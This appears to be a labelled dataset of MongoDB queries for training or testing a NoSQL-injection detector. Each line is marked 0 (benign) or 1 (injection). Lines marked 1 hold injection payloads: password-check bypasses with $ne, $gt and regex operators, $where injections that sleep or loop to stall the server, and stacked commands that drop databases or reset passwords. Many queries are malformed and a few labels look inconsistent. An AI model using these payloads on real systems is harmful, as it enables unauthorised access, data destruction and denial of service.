db.mycol.find({$and:[{"by":"tutorials point"},{"title": "MongoDB Overview"}]}).pretty()::::0
"db.collection('users').findOne({""username"": {""$ne"": null},    ""password"": {""$ne"": null}})"::::1
Document.find({ "type": { "$gte": "" } })::::1
Document.find({ "type": { "$ne: 0 "" } })::::1
db.books.insert({ title: 'The Hobbit', author: 'J.R.R. Tolkien' })::::0
db.books.find({ title: 'The Hobbit' })::::0
db.logins.find({ username: 'tolkien', password: 'hobbit' })::::0
db.logins.find({ username: { $ne: 1 }, password: { $ne: 1 } })::::1
db.doc.find({ username: 'tolkien', $or: [ {}, { 'a': 'a', password: '' } ], $comment: 'successful MongoDB injection' })::::1
db.user.save({"_id" : 1234, "name" : {"first": "foo", "last" : "bar"}})::::0
db.user.find({"_id" : 1234 })::::0
db.user.find({"name.first" : "foo"})::::0
db.getMongo().getDBNames()::::0
db.members.find({login:"admin", pass: {$ne: "parol1"} } )::::1
"db.books.insert({    title: ""As you like it"",    Author: ""William Shakespeare""})"::::0
db.foo.find( { $or : [ { a : 1 } , { b : 2 } ] } )::::0
db.foo.find( { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] } )::::1
db.myCollection.find( { $where: "this.a > 3" } );::::0
db.collection.find( { '$where' : 'function() { return artist == "Weezer"; }}' )::::1
db.collection.find ( '$where' : 'function() {var len = artist.length;for (int i=2; i<len; i++) {if (len % I == 0) return false;}return true; }')::::1
db.bands.find()::::0
db.products.find( { qty: { $gt: 25 } } )::::0
db.test.save( { a: 1 } )::::0
db.movie.insert({"name":"tutorials point"})::::0
db.dropDatabase()::::0
"db.createCollection(""mycol"", { capped : true, autoIndexId : true, size :    6142800, max : 10000 } )"::::0
db.mycollection.drop()::::0
"db.mycol.insert({   _id: ObjectId(7df78ad8902c),   title: 'MongoDB Overview',    description: 'MongoDB is no sql database',   by: 'tutorials point',   url: 'http://www.tutorialspoint.com',   tags: ['mongodb', 'database', 'NoSQL'],   likes: 100})"::::0
db.mycol.find().pretty()::::0
db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]}).pretty()::::1
db.mycol.find({$or:[{"by":"tutorials point"},{"title": "MongoDB Overview"}]}).pretty()::::0
db.mycol.update({'title':'MongoDB Overview'},{$set:{'title':'New MongoDB Tutorial'}})::::0
db.mycol.remove({'title':'MongoDB Overview'})::::0
db.mycol.find({},{"title":1,_id:0})::::0
"db.students.find( { grades: { $elemMatch: {mean: { $gt: 70 },grade: { $gt:90 }} } },{ ""grades.$"": 1 } )"::::0
"db.students.find({ $or:[{""by"":{""$ne"": null}}, {grades: { $elemMatch: {                                            mean: { $gt: 70 },                                            grade: { $gt:90 }                                          } } }]},                  { ""grades.$"": 1 } )"::::1
db.createCollection("mycol", { capped : true, autoIndexId : true,size :    6142800, max : 10000 } )::::0
db.collection('users').findOne({ "username": {"$ne": null},"password": {"$ne": null}})::::1
db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]})::::1
db.students.find( { grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 }  } } }, { "grades.$": 1 } )::::0
db.students.find({ $or:[{"by":{"$ne": null}}, {grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 }} } }]}, { "grades.$": 1 } )::::1
db.users.find({"username": {"$gt": ""},"password": {"$gt": ""})::::1
db.restaurant.updateMany({"username": {"$ne": null},,{ $set: { "Review" : true } })::::1
var query = { $where: "this.canceledOrders > " + req.body.canceledOrders } db.collection('users').find(query).each(function(err, doc) { console.log(doc); })::::1
db.articles.find({"$where": "this.hidden == false && this.category == '"+category+"'" })::::0
db.articles.find({"$where": "this.hidden == false && this.category == ' '; return '' == ' ' })::::1
db.users.find({username:'dummy'});return{username:tojson(db.getName()),password:2}}//,password:'dummy'})::::1
db.users.find({username:'dummy'});return{username:tojson(db.getCollectionName()),password:2}}//',password:dummy})::::1
db.users.save({msg: '1';sleep(10000);var%20foo='bar'})::::1
db.users.save({msg:1';var%20d%20=%20new%20Date();%20var%20cd%20=%20null;%20do%20{%20cd%20=%20new%20Date();%20}%20while(cd-d%20<%2010000);var%20foo='bar})::::1
db.library.find({ISBN: '0763754891' || '1' =='1'  })::::1
db.collection.find({$where: 'orders' > '';return true;var foo='bar'}::::1
db.collection.find({$where: 'orders' > '0;while(true);var foo='bar'}::::1
db.admins.find({user:  'rafid', $and: [passcode: ''validation_key: '' ]})::::0
db.admins.find({user:  'rafid', $or:[{},{a: 'a',$and: [passcode: '',validation_key: '']}, $comment: 'haha' ]})::::1
db.library.find{by: 'George R. R. Martin',title: 'Game of Thrones'}::::0
db.library.find({by: 'George R. R. Martin',title: 'Game of Thrones'});db.runCommand('db.dropDatabase()');({'var foo='bar'})::::1
db.users.find({username: 'rafid'});db.users.findAndModify({ query: { username:'rafid'}, update:{$set:{'a:a', password: 'dragonball'}},$comment: 'successful MongoDB injection'})::::1
db.logins.find({ username: { $ne: 0 }, password: { $ne: 0 } })::::1
db.logins.find({ username: { $gt: 0 }, password: { $gt: "" } })::::1
db.logins.find({ username: { $gte: "" }, password: { $gte: "" } })::::1
db.logins.find({ username: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })::::1
db.logins.find({ username: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })::::1
db.logins.find({ username: { $nin: [0] }, password: { $nin: [0] } })::::1
db.collection('users').findOne({ "username": "dummy", $or: [ {}, { password: "" } ]})::::1
db.collection('users').findOne({ "username": "admin", "Password" : {$or: [ {}, "abcd" ] }})::::1
db.collection('users').findOne({"username": "admin", "Password" : {$and: [{1==1}] }})::::1
db.collection('users').find({ "username": {$exists: true}, "Password" : {$exists: true}})::::1
db.collection('users').find({"username": {$not: ""}, "Password" : {$not: ""}})::::1
db.collection('users').find({ "username": {$not: null},"Password" : {$not: null}})::::1
db.collection('users').find({"username": {$nor: [{0==1}, {1==2}]},"Password" : {$nor: [{0==1},{1==2}]}})::::1
db.collection.find({$where: name == ''; return '' == ''})::::1
db.collection('users').find({"username": {$type: "string"},"Password" : {$type: "string"}})::::1
db.collections.find({$where: quantity > '';sleep(50000);;var foo='bar'})::::1
db.collection.find({$where: name == '';return(db.getCollectionNames().length == 2);var foo='bar')}::::1
db.users.find({username: 'dummy'});db.users.drop();db.users.insert({username:'rafid', password:'rafid'})::::1
db.users.find({name: 'rafid'});db.users.remove(.*);db.users.insert({ name: 'dummy'})::::1
db.users.find({name: 'dummy', $where: 1==1}, { name: '1', password: '1'})::::1
db.users.find({username: 'dummy'});return{something:1,something:2}}//', password: 'dummy'})::::1
db.users.find({username: /.*/, password: /.*/})::::1
db.users.find({username: {$nin: [/./]}, password: {$nin: [/./]}})::::1
db.users.find({username: {$in: [/.*/]}, password: {$in: [/.*/]}})::::1
db.users.find({Username: {$in:[/.a*]}, password: {$nin:[/./]}})::::1
db.users.find({Username: { $regex: /.*/i }password: { $regex: /.*/i }})::::1
db.users.find({Username: { $regex: /^a/ }password: { $regex: /.*/ }})::::1
db.collection.find({"by" : "Tutorials point"})::::0
db.collection.find({"likes" : {$lt:50}})::::0
db.collection.find({"likes" : {$lte:50}})::::0
db.collection.find({"likes" : {$gt:50}})::::0
db.collection.find({"likes" : {$gte:50}})::::0
db.collection.find({"likes" : {$ne:5}, "title" : "hex"})::::0
db.collection.find({$and: [{"by": "tut"}, {"likes" : {$gt:100}}]})::::0
db.collection.find({$and: [{"by": "tut"}, {"likes" : {$gt:100}}, {"title" : "hex"}]})::::0
db.collection.find({$or: [{"by": "tut"}, {"likes" : {$gt:100}}]})::::0
db.collection.find({$or: [{"by": "tut"}, {"likes" : {$gt:100}}, {"title" : "hex"}]})::::0
db.collection.find({$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]})::::0
db.collection.find({"likes" : {$ne:5}, "title" : "hex"}, {"by":1,_id:0})::::0
db.collection.find({$and: [{"by": "tut"}, {"likes" : {$gt:100}}]}, {"by":1,_id:0})::::0
db.collection.find({$and: [{"by": "tut"}, {"likes" : {$gt:100}}, {"title" : "hex"}]}, {"by":1,_id:0})::::0
db.collection.find({$or: [{"by": "tut"}, {"likes" : {$gt:100}}]}, {"by":1,_id:0})::::0
db.collection.find({$or: [{"by": "tut"}, {"likes" : {$gt:100}}, {"title" : "hex"}]}, {"by":1,_id:0})::::0
db.collection.find({$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]}, {"by":1,_id:0})::::0
db.collection.find({$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]}, {"by":1,_id:0})::::0
db.collection.find({$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]})::::0
db.collection.find({awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}})::::0
db.collection.find({"name.first": "Yukihiro","name.last": "Matsumoto"})::::0
db.collection.find({$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}} ]})::::0
db.collection.find({ },{_id: 0,'name.last': 1,contribs: { $slice: 2 }})::::0
db.collection.find({$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}}]},{_id: 0,'name.last': 1,contribs: { $slice: 2 }})::::0
db.collection.find({$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]},{_id: 0,'name.last': 1,contribs: { $slice: 2 }})::::0
db.collection.findOne({$or: [{ 'name.first' : /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]})::::0
db.bios.findOne({$or: [{ 'name.first' : /^G/ },{ birth: { $lt: new Date('01/01/1945') } }] },{ name: 1, contribs: 1, _id: 0 })::::0
db.collection.findOne({ contribs: 'OOP' },{ _id: 0, 'name.first': 0, birth: 0 })::::0
db.collection.findOne({$or: [{ 'name.first' : /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]},{ _id: 0, 'name.first': 0, birth: 0 })::::0
db.collection.findAndModify({query:  {$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]},sort: { rating: 1 },update: { $inc: { score: 1 } },fields: {_id:0, score: 1},bypassDocumentValidation: true})::::0
db.collection.findAndModify({query: { name: "Andy" },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})::::0
db.collection.findAndModify({query: { name: "Tom", state: "active", rating: { $gt: 10 } },sort: { rating: 1 },update: { $inc: { score: 1 } }})::::0
db.collection.findAndModify({query: { $or: [{ 'name.first' : /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]},sort: { rating: 1 },update: { $inc: { score: 1 } }})::::0
db.collection.findAndModify({query: {$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}},{ score: {$gt: 100}}]},sort: { rating: 1 },update: { $inc: { score: 1 } }})::::0
db.people.findAndModify({query: { name: "Gus", state: "active", rating: 100 },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})::::0
db.people.findAndModify({query: {$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]},sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})::::0
db.people.findAndModify({query: { name: "Pascal", state: "active", rating: 25 },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true,new: true})::::0
db.people.findAndModify({query: { state: "active" },sort: { rating: 1 },remove: true})::::0
db.people.findAndModify({query: {$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}}]},sort: { rating: 1 },remove: true})::::0
db.myColl.findAndModify({query: { category: "cafe", status: "a" },sort: { category: 1 },update: { $set: { status: "Updated" } },collation: { locale: "fr", strength: 1 }})::::0
db.myColl.findAndModify({query: {category: "cafe",$or: [{status: "a"},{status: "A"}]},sort: { category: 1 },update: { $set: { status: "Updated" } },collation: { locale: "fr", strength: 1 }})::::0
db.scores.findOneAndDelete({ "name" : "M. Tagnum" })::::0
db.collection.findAndModify({$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]},{sort: { "likes": 1},projection : {"title":1, _id:0}})::::0
db.scores.findOneAndDelete({ "name" : "A. MacGyver" },{ sort : { "points" : 1 }, maxTimeMS : 5 })::::0
db.myColl.findOneAndDelete({ category: "cafe", status: "a" },{ collation: { locale: "fr", strength: 1 } })::::0
db.scores.findOneAndReplace({ "score" : { $lt : 20000 } },{ "team" : "Observant Badgers", "score" : 20000 })::::0
db.scores.findOneAndReplace({ "score" : { $lt : 20000 } },{ "team" : "Observant Badgers", "score" : 20000 },{ sort: { "score" : 1 } })::::0
db.scores.findOneAndReplace({ "score" : { $lt : 22250 } },{ "team" : "Therapeutic Hamsters", "score" : 22250 },{ sort : { "score" : 1 }, project: { "_id" : 0, "team" : 1 } })::::0
db.scores.findOneAndReplace({ "team" : "Fortified Lobsters" },{ "_id" : 6019, "team" : "Fortified Lobsters" , "score" : 32000},{ upsert : true, returnNewDocument: true })::::0
db.myColl.findOneAndReplace({ category: "cafe", status: "a" },{ category: "cafÉ", status: "Replaced" },{ collation: { locale: "fr", strength: 1 } })::::0
db.scores.findOneAndUpdate({ "name" : "R. Stiles" },{ $inc: { "points" : 5 } })::::0
db.scores.findOneAndUpdate({ "name" : "A. MacDyver" },{ $inc : { "points" : 5 } },{ sort : { "points" : 1 } })::::0
db.scores.findOneAndUpdate({ "name" : "A. MacDyver" },{ $inc : { "points" : 5 } },{ sort : { "points" : 1 }, projection: { "assignment" : 1, "points" : 1 } })::::0
db.scores.findOneAndUpdate({ "name" : "A.B. Abracus" },{ $set: { "name" : "A.B. Abracus", "assignment" : 5}, $inc : { "points" : 5 } },{ sort: { "points" : 1 }, upsert:true, returnNewDocument : true })::::0
db.myColl.findOneAndUpdate({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });::::0
var mapFunction1 = function() {emit(this.cust_id, this.price);};var reduceFunction1 = function(keyCustId, valuesPrices) {return Array.sum(valuesPrices);};db.orders.mapReduce(mapFunction1,reduceFunction1,{ out: "map_reduce_example" })::::0
var mapFunction2 = function() {for (var idx = 0; idx < this.items.length; idx++) {var key = this.items[idx].sku;var value = {count: 1,qty: this.items[idx].qty};emit(key, value);}};var reduceFunction2 = function(keySKU, countObjVals) {reducedVal = {count: 0, qty: 0 };for (var idx = 0; idx < countObjVals.length; idx++) {reducedVal.count += countObjVals[idx].count;reducedVal.qty += countObjVals[idx].qty;}return reducedVal;};var finalizeFunction2 = function (key,reducedVal) {reducedVal.avg = reducedVal.qty/reducedVal.count;return reducedVal;};db.orders.mapReduce( mapFunction2,reduceFunction2,{out: { merge: "map_reduce_example" },query: { ord_date:{ $gt: new Date('01/01/2012') }},finalize: finalizeFunction2})::::0
var mapper = function () {emit(this.gender, 1);};var reducer = function(gender, count){return Array.sum(count);};db.sourceData.mapReduce(mapper,reducer,{out : "example1_results"});::::0
var mapper = function () {var x = {age : this.age, name : this.name};emit(this.gender, {min : x , max :x});};var reducer =function(key, values){var res = values[0];for (var i = 1; i < values.length; i++) {if(values[i].min.age < res.min.age)res.min= {name : values[i].min.name, age : values[i].min.age};if (values[i].max.age > res.max.age)res.max = {name:values[i].max.name, age : values[i].max.age};};return res;};db.sourceData.mapReduce(mapper,reducer,{out :"example2_results"});::::0
var mapper = function () {var hobbys = this.hobbies.split(',');for (i in hobbys) {emit(hobbys[i], 1);}};var reducer = function(key, values) {var count = 0;for (index in values) {count += values[index];}return count;};db.sourceData.mapReduce(mapper,reducer,{out : "example3_results"});::::0
db.runCommand( {mapReduce: "books",map: function() {for (var index = 0; index < this.authors.length; ++index) {var author =this.authors[ index ];emit( author.firstName + " " + author.lastName, 1 );}},reduce: function(author, counters) {count = 0;for (var index = 0; index < counters.length; ++index) {count += counters[index];}return count;},out: { inline: 1 }} );::::0
var map = function(){emit(this.url, 1);}var reduce = function(key, values){var res = 0;values.forEach(function(v){ res += 1});return {count: res};}db.sites.mapReduce(map, reduce, { out: "mapped_urls" });::::0
db.products.save( { item: "book", qty: 40 } )::::0
db.products.save({ item: "envelopes", qty : 100, type: "Clasp" },{ writeConcern: { w: "majority", wtimeout: 5000 } })::::0
db.products.insert([{ _id: 11, item: "pencil", qty: 50, type: "no.2" },{ item: "pen", qty: 20 },{ item: "eraser", qty: 25 }])::::0
db.products.insert([{ _id: 20, item: "lamp", qty: 50, type: "desk" },{ _id: 21, item: "lamp", qty: 20, type: "floor" },{ _id:22, item: "bulk", qty: 100 }],{ ordered: false })::::0
db.products.insert({ item: "envelopes", qty : 100, type: "Clasp" },{ writeConcern: { w: "majority", wtimeout: 5000 } })::::0
try {db.products.insertOne({ "item": "envelopes", "qty": 100, type: "Self-Sealing" },{ writeConcern: { w : "majority",wtimeout : 100 } });} catch (e) {print (e);}::::0
try {db.products.insertMany( [{ _id: 10, item: "large box", qty: 20 },{ _id: 11, item: "small box", qty: 55 },{ _id: 12, item: "medium box", qty: 30 }] );} catch (e) {print (e);}::::0
try {db.products.insertMany([{ _id: 10, item: "large box", qty: 20 },{ _id: 11, item: "small box", qty: 55 },{ _id: 12, item:"medium box", qty: 30 }],{ w: "majority", wtimeout: 100 });} catch (e) {print (e);}::::0
db.restaurants.find().sort( { "borough": 1, "address.zipcode": 1 } )::::0
db.runCommand( {mapReduce: "books",scope: { currency: "US" },map: function() {emit( this.publisher, { count: 1, price:this.price } );},reduce: function(publisher, values) {var value = { count: 0, price: 0 };for (var index = 0; index <values.length; ++index) {value.count += values[index].count;value.price += values[index].price;}return value;},finalize:function(publisher, value) {value.average = currency + ( value.price / value.count ).toFixed(2);return value;},out: {replace: "results"}} )::::0
db.runCommand( {mapReduce: "books",scope: { currency: "US" },map: function() {emit( this.publisher, { count: 1, price: this.price } );},reduce: function(publisher, values) {var value = { count: 0, price: 0 };for (var index = 0; index < values.length; ++index) {value.count += values[index].count;value.price += values[index].price;}return value;},finalize: function(publisher, value) {value.average = currency + ( value.price / value.count ).toFixed(2);return value;},query: { "authors.lastName": { $in: [ "Cantelon", "O'Higgins" ] } },limit: 2,out: {reduce: "results"}} )::::0
db.customers.find({$and: [{$or: [{"last_login": "2017-10-08"},{"last_login": "2017-10-07"},{"last_login": "2017-10-06"}]},{$or: [{"address.country": "Spain"},{"address.country": "France"}]}]})::::0
db.customers.find({$and: [{ "last_login": { $in: ["2017-10-08", "2017-10-07", "2017-10-06"] }},{ "address.country": { $in:["Spain", "French"] }},]})::::0
db.customers.find({$and: [{ "last_login": { $gte: "2017-10-06" }},{ "address.country": { $in: ["Spain", "French"] }},]})::::0
db.customers.find({"address.country": { $nin: ["Spain", "French"] }})::::0
db.car.findAndModify({query: { name: "Alto" },sort: { cno: 1 },update: { $inc: { speed: 10 } },})::::0
db.car.findAndModify({query: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 },sort: { cno: 1 },update: { $inc: {speed: 20 } },upsert: true,new: true})::::0
db.car.findAndModify({query: { name: "WagonR" },sort: { cno: 1 },update: { $inc: { speed: 5 } },upsert: <strong>true</strong>})::::0
db.car.findAndModify({query: { name: "Alto" },sort: { cno: 1 },remove: true})::::0
$col->findAndModify(array("inprogress" => false, "name" => "Biz report"),array('$set' => array('inprogress' => true, "started"=> new MongoDate())),null,array("sort" => array("priority" => -1),"new" => true,));::::0
try {$retval = $col->findAndModify(array("inprogress" => false, "name" => "Next promo"),array('$pop' => array("tasks" => -1)),array("tasks" => array('$pop' => array("stuff"))),array("new" => true));} catch(MongoResultException $e) {echo $e->getCode(), " : ", $e->getMessage(), "\n";var_dump($e->getDocument());}::::0
$studentCollection->findAndModify(array("_id" => $studentId), ('$set' => array('Active' => false, "Reason"=> "Duplicate entry" "DeleteDate" => new MongoDate())), ("Payments" => 1), array("new" => false ));::::0
try {db.restaurant.replaceOne({ "name" : "Pizza Rat's Pizzaria" },{ "_id": 4, "name" : "Pizza Rat's Pizzaria", "Borough" : "Manhattan", "violations" : 8 },{ upsert: true });} catch (e){print(e);}::::0
try {db.restaurant.replaceOne({ "name" : "Pizza Rat's Pizzaria" },{ "name" : "Pizza Rat's Pub", "Borough" : "Manhattan", "violations" : 3 },{ w: "majority", wtimeout: 100 });} catch (e) {print(e);}::::0
$map = new \MongoCode("function () { this.value['p'] = this.value['p'].replace('$from', '$to');emit(this._id, this.value);}"); $collection = $this->mongoCollection(); $reduce = new \MongoCode("function () { }"); $collection_name = $collection->getName(); $collection->db->command([ 'mapreduce' => $collection_name, 'map' => $map, 'reduce' => $reduce, 'out' => ['merge' => $collection_name], 'query' => $query, 'sort' => ['_id' => 1] ]);::::0
db.media.find({mediaContainer:"ContainerS3"}).forEach(function(e,i) { e.url=e.url.replace("//a.n.com","//b.n.com"); db.media.save(e); });::::0
db.collection('ABC').find({url: /helloWorldt/}).toArray((err, docs) => {docs.forEach(doc => { let URL = doc.URL.replace('helloWorldt', 'helloWorld'); db.collection('ABC').updateOne({_id: doc._id}, {URL}); }); });::::0
db.collection.insert( {"name":"name-here"} )$collection->insert(array("name" => "name-here"));::::0
db.collection.save( {"id":"001", "name":"name-here"} )$collection->save(array("_id" => "59d77a00640d6ca80400002d","title"=>"title-here"));::::0
db.collection.update( {"title":"old-title"}, {$set:{"title":"new-title"}} )$collection->update(array("title"=>"MongoDB Tutorial"),array('$set'=>array("title"=>"MongoDB")),);::::0
db.collection.update( {"title":"old-title"}, {$set:{"title":"new-title"}}, {multi:true} )$collection->update(array("title"=>"MongoDB Tutorial"),array('$set'=>array("title"=>"MongoDB")),array("multiple"=>true));::::0
db.collection.remove( {"title":"title-here"} )$collection->remove(array("title"=>"MongoDB"));::::0
db.collection.remove( {"title":"title-here"}, 1 )$collection->remove(array("title"=>"MongoDB"),array("justOne" => true));::::0
db.restaurant.updateOne({ "name" : "Central Perk Cafe" },{ $set: { "violations" : 3 } });$collection->update(array("name" => "Central Perk Cafe"),array('$set' => array("violations"=>3)),array("multiple" => false));::::0
db.restaurant.updateOne({ "name" : "Pizza Rat's Pizzaria" },{ $inc: { "violations" : 3}, $set: { "Closed" : true } },{ w: "majority", wtimeout: 100 });$collection->update(array("name" => "Pizza Rat's Pizzaria"),array('$inc' => array("violations"=>3), '$set' => array("Closed" => true)),array("multiple" => false, "w" => "majority", "wTimeoutMS" => 100));::::0
db.myColl.updateOne({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });$collection->update(array("category" => "cafe"),array('$set' => array("status" => "Updated")),array("multiple" => false, "collation" => array("locale" => "fr", "strength" => 1)));::::0
db.restaurant.updateMany({ violations: { $gt: 4 } },{ $set: { "Review" : true } });$collection->update(array("violations" =>array('$gt' => 4)),array('$set' => array("Review" => true)),array("multiple" => true));::::0
db.restaurant.updateMany({ "name" : "Pizza Rat's Pizzaria" },{ $inc: { "violations" : 3}, $set: { "Closed" : true } },{ w: "majority", wtimeout: 100 });$collection->update(array("name" => "Pizza Rat's Pizzaria"),array('$inc' => array("violations"=>3), '$set' => array("Closed" => true)),array("multiple" => true, "w" => "majority", "wTimeoutMS" => 100));::::0
db.myColl.updateMany({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });$collection->update(array("category" => "cafe"),array('$set' => array("status" => "Updated")),array("multiple" => true, "collation" => array("locale" => "fr", "strength" => 1)));::::0
db.demo.group({"key": {"person": true},"initial": {"sumscore": 0,"sumforaverageaveragescore": 0,"countforaverageaveragescore": 0,"countstar": 0},"reduce": function(obj, prev) {prev.sumscore = prev.sumscore + obj.score - 0;prev.sumforaverageaveragescore += obj.score;prev.countforaverageaveragescore++;prev.minimumvaluescore = isNaN(prev.minimumvaluescore) ? obj.score : Math.min(prev.minimumvaluescore, obj.score);prev.maximumvaluescore = isNaN(prev.maximumvaluescore) ? obj.score : Math.max(prev.maximumvaluescore, obj.score);if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;},"finalize": function(prev) {prev.averagescore = prev.sumforaverageaveragescore / prev.countforaverageaveragescore;delete prev.sumforaverageaveragescore;delete prev.countforaverageaveragescore;},"cond": {"score": {"$gt": 0},"person": {"$in": ["bob", "jake"]}}});::::0
db.EMPLOYEES.group({"key": {"SALARY": true},"initial": {"countstar": 0},"reduce": function(obj, prev) {if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;},"cond": {"SALARY": {"$gt": 1000}}});::::0
db.shop.group({"initial": {},"reduce": function(obj, prev) {prev.article = isNaN(prev.article) ? obj.article : Math.max(prev.article, obj.article);}});::::0
db.collection.aggregate( [{ $match : {createdDate:{ $gt : ISODate("2015-05-01T00:00:00.000Z"), $lte : ISODate("2015-05-20T23:59:59.000Z")}}},{ $group : { _id : { year: { $year: "$createdDate" },month: { $month: "$createdDate" },day: { $dayOfMonth : "$createdDate" },appId : "$appId"}}}, { $group : { _id : {appIdd: '$_id.appId'}, count: { $sum: 1 }}}, { $project: { created_date_str: {$concat:["$_id.year","-","$_id.month","-","$_id.day","T00:00:00Z"]},count: 1}}, { $project: { _id : 0, created_date: { ISODate("$created_date_str") }, count: 1}}]);::::0
$top_orders = Orders::aggregate(array( array('$group' => array('_id' => '$pro_id', 'count' => array( '$sum' => 1 ) )), array( '$match' => array( 'count' => array( '$gt' => 100 ))), array( '$sort' => array( 'count' => -1 ) ), array( '$limit' => 5 ) ));::::0
db.old_user.find({},{username:1,password:1}).forEach(function(data){ db.users.insert(data)})::::0
db.shop.group({"initial": {},"reduce": function(obj, prev) {prev.maximumvalueprice = isNaN(prev.maximumvalueprice) ? obj.price : Math.max(prev.maximumvalueprice, obj.price);}}).forEach(function(data){db.shop.find({"price": 100}, {"article": 1,"dealer": 1,"price": 1})})::::0
db.shop.aggregate([ { "$sort": { "price": -1 } }, { "$group": {"_id": null, "article": { "$first": "$article" }, "dealer": { "$first": "$dealer" }, "price": { "$first": "$price" } } } ])::::0
db.shop.aggregate([{ "$sort": { "price": 1 } },{ "$group": { "_id": null, "article": { "$last": "$article" }, "dealer": { "$last": "$dealer" }, "price": { "$last": "$price" } } } ])::::0
db.shop.group({"key": {"dealer": true},"initial": {},"reduce": function(obj, prev) {prev.maximumvalueprice = isNaN(prev.maximumvalueprice) ? obj.price :   Math.max(prev.maximumvalueprice, obj.price);}});::::0
db.shop.group({"key": {"dealer": true},"initial": {"countarticle": 0},"reduce": function(obj, prev) {if (obj.article != null) if (obj.article instanceof Array) prev.countarticle += obj.article.length;else prev.countarticle++;}});::::0
db.shop.group({"initial": {},"reduce": function(obj, prev) {prev.article = isNaN(prev.article) ? obj.article : Math.max(prev.article, obj.article);}});::::0
db.shop.find({}, {"article": 1,"dealer": 1,"price": 1}).limit(1).sort({"price": -1});::::0
db.shop.group({"key": {"article": true},"initial": {},"reduce": function(obj, prev) {prev.price = isNaN(prev.price) ? obj.price : Math.max(prev.price, obj.price);}})::::0
db.runCommand({"distinct": "officers","key": "address"});::::0
db.officers.find({"officer_id": {"$lt": 5}}, {"officer_name": 1,"address": 1}).sort({"officer_name": -1,"address": 1});::::0
db.officers.group({"key": {"address": true},"initial": {"countstar": 0},"reduce": function(obj, prev) {if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;}});::::0
db.employees.group({"key": {"emp_name": true},"initial": {"Total working hours": 0},"reduce": function(obj, prev) {prev.Total working hours = prev.Total working hours + obj.working_hours - 0;}});::::0
db.officers.find({"address": "Luck%"}, {"officer_name": 1});::::0
db.officers.find({"address": "Luc_now"}, {"officer_name": 1});::::0
db.student.find( {"sex": { $not: /^M.*/}}).pretty();::::0
db.officers.find({"officer_name": {"$in": ["Ajeet", "Vimal", "Deepika"]}});::::0
db.officers.find({"officer_name": {"$not": {"$in": ["Ajeet", "Vimal", "Deepika"]}}});::::0
db.officers.find({"officer_name": {"$ne": null}});::::0
db.officers.find({"officer_name": {"$gte": 3,"$lte": 5}});::::0
db.officers.find({"officer_name": {"$lt": 3,"$gt": 5}});::::0
db.officers.find({"officer_name": null});::::0
db.employee.find().limit(3).skip(1);::::0
db.employee.aggregate({ $sample: { size: 1 } },)::::0
db.accounts.find( username: username, password: password)::::0
db.user.save({"_id" : 1234, "name" : {"first": "foo", "last" : "bar"}})::::0
db.createCollection("mycol", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )::::0
db.students.find( { grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 } }}}, { "grades.$": 1 } )::::0
db.orders.aggregate([{$match: {status: "A"}},{$group: {_id: "$cust_id", total: {$sum: "$amount"}}}])::::0
db.orders.count()::::0
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } )::::0
db.collection.aggregate([{ $group: { _id: null, count: { $sum: 1 } } }])::::0
db.collection.aggregate([{ $match: {title: "MongoDB"} },{ $group: { _id: null, count: { $sum: 1 } } }])::::0
db.collection.find( { a: 5, b: 5 } ).count()::::0
db.collection.find( { a: 5, b: { $gt: 10 } } ).count()::::0
db.collection.find( { a: 5, b: { $in: [ 1, 2, 3 ] } } ).count()::::0
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $limit: 10 })::::0
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $limit: 10, $skip: 5 })::::0
